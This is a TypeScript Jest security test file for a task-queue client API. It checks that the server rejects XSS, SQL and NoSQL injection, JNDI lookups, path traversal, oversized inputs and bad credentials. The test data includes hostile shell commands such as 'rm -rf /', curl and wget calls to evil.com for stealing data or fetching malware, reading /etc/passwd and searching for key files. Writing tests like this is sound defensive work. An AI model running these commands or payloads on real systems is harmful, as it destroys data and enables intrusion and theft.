import { TaskQueueClient } from '../src/client';
import { ClientError } from '../src/utils/error-handling';

// Security test configuration
const SECURITY_CONFIG = {
  baseUrl: process.env.TASK_QUEUE_URL || 'http://localhost:16080',
  apiKey: process.env.TASK_QUEUE_API_KEY || 'test-api-key',
};

describe('TaskQueueClient Security Tests', () => {
  let client: TaskQueueClient;
  let testProjectId: string;

  beforeAll(async () => {
    client = new TaskQueueClient(SECURITY_CONFIG);
    
    // Create a test project for security tests
    const project = await client.createProject({
      name: `Security Test Project ${Date.now()}`,
      description: 'Project for security testing',
    });
    testProjectId = project.id;
  });

  afterAll(async () => {
    // Cleanup test project
    try {
      await client.deleteProject(testProjectId);
    } catch (error) {
      // Ignore cleanup errors
    }
  });

  describe('Input Validation and Sanitization', () => {
    it('should reject malicious task names', async () => {
      const maliciousNames = [
        '<script>alert("xss")</script>',
        '${7*7}',
        '{{7*7}}',
        'javascript:alert(1)',
        '"><script>alert("xss")</script>',
        '"><img src=x onerror=alert(1)>',
        '; DROP TABLE tasks; --',
        'UNION SELECT * FROM users',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const maliciousName of maliciousNames) {
        await expect(client.createTask({
          name: maliciousName,
          command: 'echo "test"',
          project_id: testProjectId,
          priority: 'Normal' as const,
        })).rejects.toThrow();
      }
    });

    it('should reject malicious commands', async () => {
      const maliciousCommands = [
        'rm -rf /',
        'curl http://evil.com/steal-data',
        'wget http://evil.com/malware',
        'cat /etc/passwd',
        'ps aux | grep password',
        'netstat -an | grep LISTEN',
        'find / -name "*.key" 2>/dev/null',
        'echo "password" | base64',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'node -e "require(\'fs\').writeFileSync(\'/tmp/hack\', \'hacked\')"',
      ];

      for (const maliciousCommand of maliciousCommands) {
        await expect(client.createTask({
          name: 'Security Test Task',
          command: maliciousCommand,
          project_id: testProjectId,
          priority: 'Normal' as const,
        })).rejects.toThrow();
      }
    });

    it('should reject malicious project descriptions', async () => {
      const maliciousDescriptions = [
        '<script>document.location="http://evil.com"</script>',
        '"><script>alert("xss")</script>',
        '${7*7}',
        '{{7*7}}',
        'javascript:alert(1)',
        '"><img src=x onerror=alert(1)>',
        '; DROP TABLE projects; --',
        'UNION SELECT password FROM users',
      ];

      for (const maliciousDescription of maliciousDescriptions) {
        await expect(client.createProject({
          name: 'Security Test Project',
          description: maliciousDescription,
        })).rejects.toThrow();
      }
    });

    it('should handle extremely long inputs gracefully', async () => {
      const longString = 'A'.repeat(10000); // 10KB string
      
      await expect(client.createTask({
        name: longString,
        command: 'echo "test"',
        project_id: testProjectId,
        priority: 'Normal' as const,
      })).rejects.toThrow();

      await expect(client.createProject({
        name: 'Test Project',
        description: longString,
      })).rejects.toThrow();
    });

    it('should reject invalid UUIDs', async () => {
      const invalidUuids = [
        'not-a-uuid',
        '123',
        'abc-def-ghi',
        '00000000-0000-0000-0000-000000000000',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
        '123e4567-e89b-12d3-a456-42661417400g', // Invalid character
        '123e4567-e89b-12d3-a456', // Too short
        '123e4567-e89b-12d3-a456-426614174000-extra', // Too long
      ];

      for (const invalidUuid of invalidUuids) {
        await expect(client.getTask(invalidUuid)).rejects.toThrow();
        await expect(client.getProject(invalidUuid)).rejects.toThrow();
        await expect(client.deleteTask(invalidUuid)).rejects.toThrow();
        await expect(client.deleteProject(invalidUuid)).rejects.toThrow();
      }
    });
  });

  describe('Authentication and Authorization', () => {
    it('should reject requests without API key', async () => {
      const unauthenticatedClient = new TaskQueueClient({
        baseUrl: SECURITY_CONFIG.baseUrl,
        // No API key
      });

      await expect(unauthenticatedClient.createTask({
        name: 'Test Task',
        command: 'echo "test"',
        project_id: testProjectId,
        priority: 'Normal' as const,
      })).rejects.toThrow();
    });

    it('should reject requests with invalid API key', async () => {
      const invalidKeyClient = new TaskQueueClient({
        baseUrl: SECURITY_CONFIG.baseUrl,
        apiKey: 'invalid-api-key-12345',
      });

      await expect(invalidKeyClient.createTask({
        name: 'Test Task',
        command: 'echo "test"',
        project_id: testProjectId,
        priority: 'Normal' as const,
      })).rejects.toThrow();
    });

    it('should reject requests with malformed API key', async () => {
      const malformedKeyClient = new TaskQueueClient({
        baseUrl: SECURITY_CONFIG.baseUrl,
        apiKey: '<script>alert("xss")</script>',
      });

      await expect(malformedKeyClient.createTask({
        name: 'Test Task',
        command: 'echo "test"',
        project_id: testProjectId,
        priority: 'Normal' as const,
      })).rejects.toThrow();
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid successive requests gracefully', async () => {
      const requestCount = 100;
      const requests = Array.from({ length: requestCount }, () => 
        client.healthCheck()
      );

      const startTime = Date.now();
      const results = await Promise.allSettled(requests);
      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should complete within reasonable time
      expect(duration).toBeLessThan(30000); // 30 seconds

      // Some requests might fail due to rate limiting, which is expected
      const successCount = results.filter(r => r.status === 'fulfilled').length;
      const failureCount = results.filter(r => r.status === 'rejected').length;
      
      expect(successCount + failureCount).toBe(requestCount);
      expect(successCount).toBeGreaterThan(0); // At least some should succeed
    }, 60000);

    it('should handle concurrent requests without overwhelming the server', async () => {
      const concurrentCount = 50;
      const requests = Array.from({ length: concurrentCount }, (_, i) => 
        client.createTask({
          name: `Concurrent Security Test ${i}`,
          command: 'echo "security test"',
          project_id: testProjectId,
          priority: 'Normal' as const,
        })
      );

      const startTime = Date.now();
      const results = await Promise.allSettled(requests);
      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should complete within reasonable time
      expect(duration).toBeLessThan(60000); // 60 seconds

      // Cleanup successful tasks
      const successfulTasks = results
        .filter(r => r.status === 'fulfilled')
        .map(r => (r as PromiseFulfilledResult<any>).value);
      
      await Promise.allSettled(
        successfulTasks.map(task => client.deleteTask(task.id))
      );
    }, 90000);
  });

  describe('Data Privacy and Information Disclosure', () => {
    it('should not expose sensitive information in error messages', async () => {
      const sensitiveUuid = '123e4567-e89b-12d3-a456-426614174000';
      
      try {
        await client.getTask(sensitiveUuid);
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Error message should not contain sensitive information
        expect(errorMessage).not.toContain('password');
        expect(errorMessage).not.toContain('secret');
        expect(errorMessage).not.toContain('key');
        expect(errorMessage).not.toContain('token');
        expect(errorMessage).not.toContain('database');
        expect(errorMessage).not.toContain('connection');
        expect(errorMessage).not.toContain('internal');
      }
    });

    it('should not expose internal server paths in error messages', async () => {
      try {
        await client.createTask({
          name: 'Test Task',
          command: 'echo "test"',
          project_id: '../../../etc/passwd', // Invalid path
          priority: 'Normal' as const,
        });
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Error message should not contain internal paths
        expect(errorMessage).not.toContain('/etc/');
        expect(errorMessage).not.toContain('/var/');
        expect(errorMessage).not.toContain('/usr/');
        expect(errorMessage).not.toContain('/home/');
        expect(errorMessage).not.toContain('C:\\');
        expect(errorMessage).not.toContain('D:\\');
      }
    });
  });

  describe('Injection Attacks', () => {
    it('should prevent SQL injection in task data', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE tasks; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO tasks VALUES ('hacked', 'hacked'); --",
        "' OR 1=1 --",
        "'; UPDATE tasks SET name='hacked'; --",
      ];

      for (const payload of sqlInjectionPayloads) {
        await expect(client.createTask({
          name: payload,
          command: 'echo "test"',
          project_id: testProjectId,
          priority: 'Normal' as const,
        })).rejects.toThrow();
      }
    });

    it('should prevent NoSQL injection in project data', async () => {
      const nosqlInjectionPayloads = [
        '{"$where": "this.name == this.password"}',
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.constructor.constructor(\'return process\')().exit(1)"}',
      ];

      for (const payload of nosqlInjectionPayloads) {
        await expect(client.createProject({
          name: payload,
          description: 'Test project',
        })).rejects.toThrow();
      }
    });

    it('should prevent command injection in task commands', async () => {
      const commandInjectionPayloads = [
        'echo "test"; rm -rf /',
        'echo "test" && curl http://evil.com',
        'echo "test" | cat /etc/passwd',
        'echo "test" && wget http://evil.com/malware',
        'echo "test"; python -c "import os; os.system(\'rm -rf /\')"',
        'echo "test" && node -e "require(\'fs\').writeFileSync(\'/tmp/hack\', \'hacked\')"',
      ];

      for (const payload of commandInjectionPayloads) {
        await expect(client.createTask({
          name: 'Security Test Task',
          command: payload,
          project_id: testProjectId,
          priority: 'Normal' as const,
        })).rejects.toThrow();
      }
    });
  });

  describe('Resource Exhaustion', () => {
    it('should handle large request payloads gracefully', async () => {
      const largeMetadata = {};
      for (let i = 0; i < 1000; i++) {
        largeMetadata[`key${i}`] = 'A'.repeat(100);
      }

      await expect(client.createProject({
        name: 'Large Metadata Project',
        description: 'Project with large metadata',
        metadata: largeMetadata,
      })).rejects.toThrow();
    });

    it('should limit the number of tags in projects', async () => {
      const manyTags = Array.from({ length: 1000 }, (_, i) => `tag${i}`);

      await expect(client.createProject({
        name: 'Many Tags Project',
        description: 'Project with many tags',
        tags: manyTags,
      })).rejects.toThrow();
    });

    it('should limit the number of acceptance criteria in tasks', async () => {
      const manyCriteria = Array.from({ length: 1000 }, (_, i) => `Criterion ${i}`);

      await expect(client.createTask({
        name: 'Many Criteria Task',
        command: 'echo "test"',
        project_id: testProjectId,
        priority: 'Normal' as const,
        acceptance_criteria: manyCriteria,
      })).rejects.toThrow();
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose stack traces in production', async () => {
      try {
        await client.getTask('invalid-uuid');
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Should not contain stack trace information
        expect(errorMessage).not.toContain('at ');
        expect(errorMessage).not.toContain('Error:');
        expect(errorMessage).not.toContain('TypeError:');
        expect(errorMessage).not.toContain('ReferenceError:');
        expect(errorMessage).not.toContain('.js:');
        expect(errorMessage).not.toContain('.ts:');
      }
    });

    it('should handle malformed JSON responses securely', async () => {
      // This test would require a mock server that returns malformed JSON
      // For now, we test that the client handles unexpected responses gracefully
      const client = new TaskQueueClient(SECURITY_CONFIG);
      
      try {
        await client.healthCheck();
      } catch (error) {
        // Should handle errors gracefully without exposing internal details
        expect(error).toBeInstanceOf(Error);
      }
    });
  });
});
